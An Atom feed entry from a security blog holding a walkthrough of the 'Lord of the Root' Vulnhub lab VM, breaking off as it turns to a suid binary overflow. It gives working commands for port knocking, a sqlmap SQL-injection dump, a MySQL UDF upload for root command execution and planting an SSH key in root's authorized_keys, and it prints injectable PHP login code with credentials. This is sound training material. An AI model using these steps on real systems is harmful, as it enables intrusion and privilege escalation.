<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2015-10-04T11:23:41+02:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Lord of the Root]]></title>
    <link href="http://barrebas.github.io/blog/2015/10/04/lord-of-the-root/"/>
    <updated>2015-10-04T10:02:33+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/10/04/lord-of-the-root</id>
    <content type="html"><![CDATA[<p>I figured I&rsquo;d try another VM from Vulnhub for a change. This is Lord of the Root v1.0.1.</p>

<!--more-->


<p><em>Note</em>: Before I could even start the VM with Virtualbox, I had to unpack the .ova, delete the .mf file and remove xml entries from the .ovf file.</p>

<p>The first portscan yielded only ssh as an open port. Upon connecting we get this banner:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ssh root@192.168.56.101
</span><span class='line'>
</span><span class='line'>                                                  .____    _____________________________
</span><span class='line'>                                                  <span class="p">|</span>    <span class="p">|</span>   <span class="se">\_</span>____  <span class="se">\_</span>_    ___/<span class="se">\_</span>_____   <span class="se">\</span>
</span><span class='line'>                                                  <span class="p">|</span>    <span class="p">|</span>    /   <span class="p">|</span>   <span class="se">\|</span>    <span class="p">|</span>    <span class="p">|</span>       _/
</span><span class='line'>                                                  <span class="p">|</span>    <span class="p">|</span>___/    <span class="p">|</span>    <span class="se">\ </span>   <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>   <span class="se">\</span>
</span><span class='line'>                                                  <span class="p">|</span>_______ <span class="se">\_</span>______  /____<span class="p">|</span>    <span class="p">|</span>____<span class="p">|</span>_  /
</span><span class='line'>                                                          <span class="se">\/</span>       <span class="se">\/</span>                 <span class="se">\/</span>
</span><span class='line'> ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
</span><span class='line'><span class="p">|</span>    <span class="p">|</span>/ _<span class="p">|</span> ____   ____   ____ <span class="p">|</span>  <span class="p">|</span> __ <span class="se">\_</span>   _____/______<span class="p">|</span>__<span class="p">|</span> ____   ____    __<span class="p">|</span> _/ <span class="se">\_</span>_    ___/___   <span class="se">\_</span>   _____/ _____/  <span class="p">|</span>_  ___________
</span><span class='line'><span class="p">|</span>      &lt;  /    <span class="se">\ </span>/  _ <span class="se">\_</span>/ ___<span class="se">\|</span>  <span class="p">|</span>/ /  <span class="p">|</span>    __<span class="o">)</span> <span class="se">\_</span>  __ <span class="se">\ </span> <span class="p">|</span>/ __ <span class="se">\ </span>/    <span class="se">\ </span> / __ <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span> /  _ <span class="se">\ </span>  <span class="p">|</span>    __<span class="o">)</span>_ /    <span class="se">\ </span>  __<span class="se">\/</span> __ <span class="se">\_</span>  __ <span class="se">\</span>
</span><span class='line'><span class="p">|</span>    <span class="p">|</span>  <span class="se">\|</span>   <span class="p">|</span>  <span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  <span class="se">\_</span>__<span class="p">|</span>    &lt;   <span class="p">|</span>     <span class="se">\ </span>  <span class="p">|</span>  <span class="p">|</span> <span class="se">\/</span>  <span class="se">\ </span> ___/<span class="p">|</span>   <span class="p">|</span>  <span class="se">\/</span> /_/ <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span><span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  <span class="p">|</span>        <span class="se">\ </span>  <span class="p">|</span>  <span class="se">\ </span> <span class="p">|</span> <span class="se">\ </span> ___/<span class="p">|</span>  <span class="p">|</span> <span class="se">\/</span>
</span><span class='line'><span class="p">|</span>____<span class="p">|</span>__ <span class="se">\_</span>__<span class="p">|</span>  /<span class="se">\_</span>___/ <span class="se">\_</span>__  &gt;__<span class="p">|</span>_ <span class="se">\ </span> <span class="se">\_</span>__  /   <span class="p">|</span>__<span class="p">|</span>  <span class="p">|</span>__<span class="p">|</span><span class="se">\_</span>__  &gt;___<span class="p">|</span>  /<span class="se">\_</span>___ <span class="p">|</span>    <span class="p">|</span>____<span class="p">|</span> <span class="se">\_</span>___/  /_______  /___<span class="p">|</span>  /__<span class="p">|</span>  <span class="se">\_</span>__  &gt;__<span class="p">|</span>
</span><span class='line'>        <span class="se">\/</span>    <span class="se">\/</span>            <span class="se">\/</span>     <span class="se">\/</span>      <span class="se">\/</span>                  <span class="se">\/</span>     <span class="se">\/</span>      <span class="se">\/</span>                           <span class="se">\/</span>     <span class="se">\/</span>          <span class="se">\/</span>
</span><span class='line'>Easy as 1,2,3
</span><span class='line'>root@192.168.56.101<span class="err">&#39;</span>s password:
</span></code></pre></td></tr></table></div></figure>


<p>&ldquo;Knock Friend to Enter&rdquo; and &ldquo;Easy as 1,2,3&rdquo; so that has to be port-knocking. I tried to &ldquo;knock&rdquo; with <code>nc</code>, but that didn&rsquo;t work. I hoped the sequence was indeed 1,2,3 so I just used nmap to do it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>nmap -n -T4 -sV -Pn -r 192.168.56.101 -p1,2,3
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.00 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2015-10-04 10:15 CEST
</span><span class='line'>Nmap scan report <span class="k">for</span> 192.168.56.101
</span><span class='line'>Host is up.
</span><span class='line'>PORT  STATE    SERVICE     VERSION
</span><span class='line'>1/tcp filtered tcpmux
</span><span class='line'>2/tcp filtered compressnet
</span><span class='line'>3/tcp filtered compressnet
</span></code></pre></td></tr></table></div></figure>


<p>And after this, port 1337 was open:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>1337/tcp open  http    Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s a webserver that serves a single page. I tried to view robots.txt but was given another picture (two hipster hobbits or something). However, the page source contained <code>&lt;!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&gt;</code>. Let&rsquo;s decode that base64:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&#39;</span> <span class="p">|</span>base64 -d
</span><span class='line'><span class="nv">Lzk3ODM0NTIxMC9pbmRleC5waHA</span><span class="o">=</span> Closer!
</span><span class='line'><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;Lzk3ODM0NTIxMC9pbmRleC5waHA=&#39;</span> <span class="p">|</span>base64 -d
</span><span class='line'>/978345210/index.php
</span></code></pre></td></tr></table></div></figure>


<p>OK so I browsed to that location. It&rsquo;s a login page that is vulnerable to SQLi. I had a hard time finding and exploiting it, because I made a silly mistake. I dumped the database I needed, finally, with this command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>python ./sqlmap.py -u <span class="s2">&quot;http://192.168.56.101:1337/978345210/index.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;username=bleh&amp;password=d&amp;submit= Login &quot;</span> --risk <span class="m">3</span> --level <span class="m">3</span> --dump -D Webapp -t password --dbms<span class="o">=</span>mysql
</span></code></pre></td></tr></table></div></figure>


<p>In first instance, however, I only used <code>--data "username=bleh&amp;password=d</code>, which prevented SQLmap from finding the SQLi. Note to future self: <em>always</em> include <em>all</em> form parameters!</p>

<p>Anyway, dumping all the data from the db took too long because it was blind SQLi so I just dumped <code>Webapp</code> once I found the database names. Long live SQLmap! This database contained usernames based on Lord of the Rings. I tried logging in to the webpage but couldn&rsquo;t find anything interesting. I tried the five usernames against ssh and struck gold with <code>smeagol:MyPreciousR00t</code>.</p>

<p>From here, there were two ways to root the box: one via a suid binary, one via <code>mysql</code>. I&rsquo;ll start with the SQL route.</p>

<h2>Root via mysql</h2>

<p><code>mysql</code> is running as root:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>smeagol@LordOfTheRoot:~<span class="nv">$ </span>ps aux <span class="p">|</span>grep sql
</span><span class='line'>root      <span class="m">1085</span>  2.0  4.2 <span class="m">318220</span> <span class="m">43072</span> ?        Ssl  04:07   0:26 /usr/sbin/mysqld
</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s really nice. I grabbed the login from the web source:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>smeagol@LordOfTheRoot:~<span class="nv">$ </span>cat /var/www/978345210/login.php
</span><span class='line'>&lt;?php
</span><span class='line'>session_start<span class="o">()</span><span class="p">;</span> // Starting Session
</span><span class='line'><span class="nv">$error</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span> // Variable To Store Error Message
</span><span class='line'><span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;submit&#39;</span><span class="o">]))</span> <span class="o">{</span>
</span><span class='line'>  <span class="k">if</span> <span class="o">(</span>empty<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;username&#39;</span><span class="o">])</span> <span class="o">||</span> empty<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;password&#39;</span><span class="o">]))</span> <span class="o">{</span>
</span><span class='line'>      <span class="nv">$error</span> <span class="o">=</span> <span class="s2">&quot;Username or Password is invalid&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="o">}</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>  <span class="o">{</span>
</span><span class='line'>      // Define <span class="nv">$username</span> and <span class="nv">$password</span>
</span><span class='line'>      <span class="nv">$username</span><span class="o">=</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;username&#39;</span><span class="o">]</span><span class="p">;</span>
</span><span class='line'>      <span class="nv">$password</span><span class="o">=</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;password&#39;</span><span class="o">]</span><span class="p">;</span>
</span><span class='line'>      <span class="nv">$db</span> <span class="o">=</span> new mysqli<span class="o">(</span><span class="s1">&#39;localhost&#39;</span>, <span class="s1">&#39;root&#39;</span>, <span class="s1">&#39;darkshadow&#39;</span>, <span class="s1">&#39;Webapp&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      // To protect MySQL injection <span class="k">for</span> Security purpose
</span><span class='line'>      <span class="nv">$username</span> <span class="o">=</span> stripslashes<span class="o">(</span><span class="nv">$username</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>      <span class="nv">$password</span> <span class="o">=</span> stripslashes<span class="o">(</span><span class="nv">$password</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="nv">$sql</span><span class="o">=</span><span class="s2">&quot;select username, password from Users where username=&#39;&quot;</span>.<span class="nv">$username</span>.<span class="s2">&quot;&#39; AND password=&#39;&quot;</span>.<span class="nv">$password</span>.<span class="s2">&quot;&#39;;&quot;</span><span class="p">;</span>
</span><span class='line'>      //echo <span class="nv">$sql</span><span class="p">;</span>
</span><span class='line'>                <span class="nv">$query</span> <span class="o">=</span> <span class="nv">$db</span>-&gt;query<span class="o">(</span><span class="nv">$sql</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>                <span class="nv">$rows</span> <span class="o">=</span> <span class="nv">$query</span>-&gt;num_rows<span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span> <span class="o">(</span><span class="nv">$rows</span> <span class="o">==</span> 1<span class="o">)</span> <span class="o">{</span>
</span><span class='line'>          <span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;login_user&#39;</span><span class="o">]=</span><span class="nv">$username</span><span class="p">;</span> // Initializing Session
</span><span class='line'>          header<span class="o">(</span><span class="s2">&quot;location: profile.php&quot;</span><span class="o">)</span><span class="p">;</span> // Redirecting To Other Page
</span><span class='line'>      <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span><span class='line'>          <span class="nv">$error</span> <span class="o">=</span> <span class="s2">&quot;Username or Password is invalid&quot;</span><span class="p">;</span>
</span><span class='line'>      <span class="o">}</span>
</span><span class='line'>  <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>?&gt;
</span></code></pre></td></tr></table></div></figure>


<p>We can now login to <code>mysql</code> as root and upload <code>lib_mysqludf_sys</code> to enable command execution. I ripped parts from my <a href="https://barrebas.github.io/blog/2014/11/03/we-need-to-go-deeper-kvasir-writeup/">Kvasir</a> writeup. I cloned the <a href="https://github.com/mysqludf/lib_mysqludf_sys">lib_mysqludf_sys</a> repo and ran the following commands:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">echo</span> <span class="s2">&quot;SELECT 0x&quot;</span> &gt; payload
</span><span class='line'>cat lib_mysqludf_sys.so <span class="p">|</span>xxd -p &gt;&gt; payload
</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot; INTO DUMPFILE &#39;/usr/lib/mysql/plugin/udf_exploit.so&#39;; &quot;</span> &gt;&gt; payload
</span></code></pre></td></tr></table></div></figure>


<p><code>payload</code> was ran through <code>tr -d '\n'</code> to remove newlines and the output of that command was entered into the mysql prompt. This creates the <code>udf_exploit.so</code> file on the remote box. From there, I ran:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mysql&gt; CREATE FUNCTION sys_exec RETURNS int SONAME <span class="s1">&#39;udf_exploit.so&#39;</span><span class="p">;</span>
</span><span class='line'>Query OK, <span class="m">0</span> rows affected <span class="o">(</span>0.00 sec<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>I created ssh keys for this joyous occasion and upload the public key to the root directory:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mysql&gt; SELECT <span class="s2">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhzEQ1uE0pjtDVHQZg17PP1rihY0ju7u0fBSJax/oAfxWXia9e229BpW+P6U08zEE4FhnhKdy4Tqyz8sdqwiPFldi8MkzA68oWBP5QwwGBF+CGrsQ7b8CLDSESPOKMx8uTz71OJObHRzC6Vtuhe9CD3unoTw5i1XNRq/Hl3Zm/BaYQB9yQMA6FoE7qt8UhZS1uis9EsNGvUSvYdrRUM7XiWEsml6Q9EGFs0jVZn/UGCr4rD/t0yqNtAKtH+9j2GRbh2pKTynfFXuHTzzODtiHzbEfmO/ma4B2gcyEzj+FBHxhwZAWQ349Fy/m1oDUJsbnk+tlLbdbPoDOTeS1nOAzD&quot;</span> INTO OUTFILE <span class="s1">&#39;/root/.ssh/autorized_keys&#39;</span><span class="p">;</span>
</span><span class='line'>Query OK, <span class="m">1</span> row affected <span class="o">(</span>0.00 sec<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>mysql&gt; SELECT sys_exec<span class="o">(</span><span class="s2">&quot;chmod 600 /root/.ssh/authorized_keys&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>+--------------------------------------------------+
</span><span class='line'><span class="p">|</span> sys_exec<span class="o">(</span><span class="s2">&quot;chmod 600 /root/.ssh/authorized_keys&quot;</span><span class="o">)</span> <span class="p">|</span>
</span><span class='line'>+--------------------------------------------------+
</span><span class='line'><span class="p">|</span>                                                <span class="m">0</span> <span class="p">|</span>
</span><span class='line'>+--------------------------------------------------+
</span><span class='line'><span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.02 sec<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now I could ssh in as root:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ssh root@192.168.56.101 -i ./rootkey
</span><span class='line'>
</span><span class='line'>                                                  .____    _____________________________
</span><span class='line'>                                                  <span class="p">|</span>    <span class="p">|</span>   <span class="se">\_</span>____  <span class="se">\_</span>_    ___/<span class="se">\_</span>_____   <span class="se">\</span>
</span><span class='line'>                                                  <span class="p">|</span>    <span class="p">|</span>    /   <span class="p">|</span>   <span class="se">\|</span>    <span class="p">|</span>    <span class="p">|</span>       _/
</span><span class='line'>                                                  <span class="p">|</span>    <span class="p">|</span>___/    <span class="p">|</span>    <span class="se">\ </span>   <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>   <span class="se">\</span>
</span><span class='line'>                                                  <span class="p">|</span>_______ <span class="se">\_</span>______  /____<span class="p">|</span>    <span class="p">|</span>____<span class="p">|</span>_  /
</span><span class='line'>                                                          <span class="se">\/</span>       <span class="se">\/</span>                 <span class="se">\/</span>
</span><span class='line'> ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
</span><span class='line'><span class="p">|</span>    <span class="p">|</span>/ _<span class="p">|</span> ____   ____   ____ <span class="p">|</span>  <span class="p">|</span> __ <span class="se">\_</span>   _____/______<span class="p">|</span>__<span class="p">|</span> ____   ____    __<span class="p">|</span> _/ <span class="se">\_</span>_    ___/___   <span class="se">\_</span>   _____/ _____/  <span class="p">|</span>_  ___________
</span><span class='line'><span class="p">|</span>      &lt;  /    <span class="se">\ </span>/  _ <span class="se">\_</span>/ ___<span class="se">\|</span>  <span class="p">|</span>/ /  <span class="p">|</span>    __<span class="o">)</span> <span class="se">\_</span>  __ <span class="se">\ </span> <span class="p">|</span>/ __ <span class="se">\ </span>/    <span class="se">\ </span> / __ <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span> /  _ <span class="se">\ </span>  <span class="p">|</span>    __<span class="o">)</span>_ /    <span class="se">\ </span>  __<span class="se">\/</span> __ <span class="se">\_</span>  __ <span class="se">\</span>
</span><span class='line'><span class="p">|</span>    <span class="p">|</span>  <span class="se">\|</span>   <span class="p">|</span>  <span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  <span class="se">\_</span>__<span class="p">|</span>    &lt;   <span class="p">|</span>     <span class="se">\ </span>  <span class="p">|</span>  <span class="p">|</span> <span class="se">\/</span>  <span class="se">\ </span> ___/<span class="p">|</span>   <span class="p">|</span>  <span class="se">\/</span> /_/ <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span><span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  <span class="p">|</span>        <span class="se">\ </span>  <span class="p">|</span>  <span class="se">\ </span> <span class="p">|</span> <span class="se">\ </span> ___/<span class="p">|</span>  <span class="p">|</span> <span class="se">\/</span>
</span><span class='line'><span class="p">|</span>____<span class="p">|</span>__ <span class="se">\_</span>__<span class="p">|</span>  /<span class="se">\_</span>___/ <span class="se">\_</span>__  &gt;__<span class="p">|</span>_ <span class="se">\ </span> <span class="se">\_</span>__  /   <span class="p">|</span>__<span class="p">|</span>  <span class="p">|</span>__<span class="p">|</span><span class="se">\_</span>__  &gt;___<span class="p">|</span>  /<span class="se">\_</span>___ <span class="p">|</span>    <span class="p">|</span>____<span class="p">|</span> <span class="se">\_</span>___/  /_______  /___<span class="p">|</span>  /__<span class="p">|</span>  <span class="se">\_</span>__  &gt;__<span class="p">|</span>
</span><span class='line'>        <span class="se">\/</span>    <span class="se">\/</span>            <span class="se">\/</span>     <span class="se">\/</span>      <span class="se">\/</span>                  <span class="se">\/</span>     <span class="se">\/</span>      <span class="se">\/</span>                           <span class="se">\/</span>     <span class="se">\/</span>          <span class="se">\/</span>
</span><span class='line'>Easy as 1,2,3
</span><span class='line'>Welcome to Ubuntu 14.04.3 LTS <span class="o">(</span>GNU/Linux 3.19.0-25-generic i686<span class="o">)</span>
</span><span class='line'>
</span><span class='line'> * Documentation:  https://help.ubuntu.com/
</span><span class='line'>
</span><span class='line'>                            .____    _____________________________
</span><span class='line'>                            <span class="p">|</span>    <span class="p">|</span>   <span class="se">\_</span>____  <span class="se">\_</span>_    ___/<span class="se">\_</span>_____   <span class="se">\ </span>
</span><span class='line'>                            <span class="p">|</span>    <span class="p">|</span>    /   <span class="p">|</span>   <span class="se">\|</span>    <span class="p">|</span>    <span class="p">|</span>       _/
</span><span class='line'>                            <span class="p">|</span>    <span class="p">|</span>___/    <span class="p">|</span>    <span class="se">\ </span>   <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>   <span class="se">\ </span>
</span><span class='line'>                            <span class="p">|</span>_______ <span class="se">\_</span>______  /____<span class="p">|</span>    <span class="p">|</span>____<span class="p">|</span>_  /
</span><span class='line'>                                    <span class="se">\/</span>       <span class="se">\/</span>                 <span class="se">\/</span>
</span><span class='line'> __      __       .__                                ___________      .__                   .___
</span><span class='line'>/  <span class="se">\ </span>   /  <span class="se">\ </span>____ <span class="p">|</span>  <span class="p">|</span>   ____  ____   _____   ____   <span class="se">\_</span>   _____/______<span class="p">|</span>__<span class="p">|</span> ____   ____    __<span class="p">|</span> _/
</span><span class='line'><span class="se">\ </span>  <span class="se">\/\/</span>   // __ <span class="se">\|</span>  <span class="p">|</span> _/ ___<span class="se">\/</span>  _ <span class="se">\ </span>/     <span class="se">\_</span>/ __ <span class="se">\ </span>  <span class="p">|</span>    __<span class="o">)</span> <span class="se">\_</span>  __ <span class="se">\ </span> <span class="p">|</span>/ __ <span class="se">\ </span>/    <span class="se">\ </span> / __ <span class="p">|</span>
</span><span class='line'> <span class="se">\ </span>       /<span class="se">\ </span> ___/<span class="p">|</span>  <span class="p">|</span>_<span class="se">\ </span> <span class="se">\_</span>_<span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  Y Y  <span class="se">\ </span> ___/   <span class="p">|</span>     <span class="se">\ </span>  <span class="p">|</span>  <span class="p">|</span> <span class="se">\/</span>  <span class="se">\ </span> ___/<span class="p">|</span>   <span class="p">|</span>  <span class="se">\/</span> /_/ <span class="p">|</span>
</span><span class='line'>  <span class="se">\_</span>_/<span class="se">\ </span> /  <span class="se">\_</span>__  &gt;____/<span class="se">\_</span>__  &gt;____/<span class="p">|</span>__<span class="p">|</span>_<span class="p">|</span>  /<span class="se">\_</span>__  &gt;  <span class="se">\_</span>__  /   <span class="p">|</span>__<span class="p">|</span>  <span class="p">|</span>__<span class="p">|</span><span class="se">\_</span>__  &gt;___<span class="p">|</span>  /<span class="se">\_</span>___ <span class="p">|</span>
</span><span class='line'>       <span class="se">\/</span>       <span class="se">\/</span>          <span class="se">\/</span>            <span class="se">\/</span>     <span class="se">\/</span>       <span class="se">\/</span>                  <span class="se">\/</span>     <span class="se">\/</span>      <span class="se">\/</span>
</span><span class='line'>Last login: Sun Oct  <span class="m">4</span> 04:38:51 <span class="m">2015</span> from 192.168.56.1
</span><span class='line'>root@LordOfTheRoot:~#
</span></code></pre></td></tr></table></div></figure>


<p>So that&rsquo;s the <code>mysql</code> route. Now on to the binary!</p>

<h2>Vulnerable binary</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>smeagol@LordOfTheRoot:~<span class="nv">$ </span>find / -perm -4000 -type f 2&gt;/dev/null
</span><span class='line'>/bin/fusermount
</span><span class='line'>/bin/su
</span><span class='line'>/bin/mount
</span><span class='line'>/bin/ping
</span><span class='line'>/bin/umount
</span><span class='line'>/bin/ping6
</span><span class='line'>/SECRET/door2/file
</span><span class='line'>/SECRET/door1/file
</span><span class='line'>/SECRET/door3/file
</span></code></pre></td></tr></table></div></figure>


<p>Ah, interesting. This reminds me of knock-knock.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>smeagol@LordOfTheRoot:~<span class="nv">$ </span>md5sum /SECRET/door*/file
</span><span class='line'>f0c663095117d908e16412570d2c6252  /SECRET/door1/file
</span><span class='line'>f0c663095117d908e16412570d2c6252  /SECRET/door2/file
</span><span class='line'>bb0e0e4439b5039e71405f8a1b6d5c0c  /SECRET/door3/file
</span></code></pre></td></tr></table></div></figure>


<p>I grabbed <code>door3</code> and started analysing it on my local box. It contains a <code>strcpy</code> that allows us to control EIP.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
